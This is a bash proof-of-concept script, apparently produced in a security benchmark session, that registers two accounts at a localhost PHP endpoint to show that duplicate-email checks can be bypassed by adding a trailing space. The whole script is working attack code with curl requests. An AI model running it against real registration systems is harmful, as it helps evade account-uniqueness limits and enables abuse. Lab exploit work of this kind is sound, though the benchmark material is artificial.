#!/bin/bash
# POC: Demonstrates email collision attack by bypassing duplicate email detection using trailing whitespace. Registers two accounts with the same email address (one with trailing space) to prove the vulnerability.
# Target: ./repo
# Created: 2025-12-01T16:06:29.070Z
# Session: benchmark-XBEN-069-24-minbd4jr

# Email Collision Attack - Whitespace Bypass POC
# This script demonstrates the ability to bypass duplicate email detection
# by appending whitespace (space character) to an email address

TARGET_URL="http://localhost:8080/api/register.php"
TIMESTAMP=$(date +%s)

# Use unique usernames for each test run
USERNAME1="email_user1_${TIMESTAMP}"
USERNAME2="email_user2_${TIMESTAMP}"

# Use the same base email for both registrations
BASE_EMAIL="collision_test_${TIMESTAMP}@test.com"
EMAIL_WITH_SPACE="${BASE_EMAIL}%20"  # URL-encoded space

echo "=========================================="
echo "Email Collision Attack - Whitespace Bypass"
echo "=========================================="
echo ""

# Test 1: Register first account with normal email
echo "[*] Test 1: Registering first account with email: ${BASE_EMAIL}"
echo "[*] Username: ${USERNAME1}"
echo "[*] Password: TestPass123"
echo ""

RESPONSE1=$(curl -s -X POST "${TARGET_URL}" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${USERNAME1}&password=TestPass123&email=${BASE_EMAIL}" \
  -w "\n%{http_code}")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -1)
BODY1=$(echo "$RESPONSE1" | head -n -1)

echo "[+] Response Status: HTTP ${HTTP_CODE1}"
echo "[+] Response Body: ${BODY1}"
echo ""

if [[ "$HTTP_CODE1" == "200" ]]; then
  echo "[✓] First registration successful - Account created with email: ${BASE_EMAIL}"
else
  echo "[✗] First registration failed. Cannot proceed with POC."
  exit 1
fi

echo ""
echo "=========================================="
echo ""

# Test 2: Register second account with email + trailing space (should fail but doesn't)
echo "[*] Test 2: Registering second account with email: ${BASE_EMAIL} (with trailing space)"
echo "[*] Username: ${USERNAME2}"
echo "[*] Password: TestPass123"
echo "[*] Note: Trailing space is URL-encoded as %20"
echo ""

RESPONSE2=$(curl -s -X POST "${TARGET_URL}" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${USERNAME2}&password=TestPass123&email=${EMAIL_WITH_SPACE}" \
  -w "\n%{http_code}")

HTTP_CODE2=$(echo "$RESPONSE2" | tail -1)
BODY2=$(echo "$RESPONSE2" | head -n -1)

echo "[+] Response Status: HTTP ${HTTP_CODE2}"
echo "[+] Response Body: ${BODY2}"
echo ""

if [[ "$HTTP_CODE2" == "200" ]]; then
  echo "[✓ VULNERABILITY CONFIRMED] Second registration successful - Duplicate email detection bypassed!"
  echo "[!] Both accounts were created with the same email address:"
  echo "    - Account 1: ${USERNAME1} with email ${BASE_EMAIL}"
  echo "    - Account 2: ${USERNAME2} with email ${BASE_EMAIL}%20 (with trailing space)"
  echo ""
  echo "[!] This allows attackers to:"
  echo "    - Create multiple accounts with the same email"
  echo "    - Bypass email uniqueness restrictions"
  echo "    - Perform account enumeration attacks"
  echo "    - Facilitate credential reuse and phishing attacks"
  exit 0
else
  echo "[✗] Second registration failed - Duplicate detection is working properly"
  echo "[!] Status: ${HTTP_CODE2}"
  exit 1
fi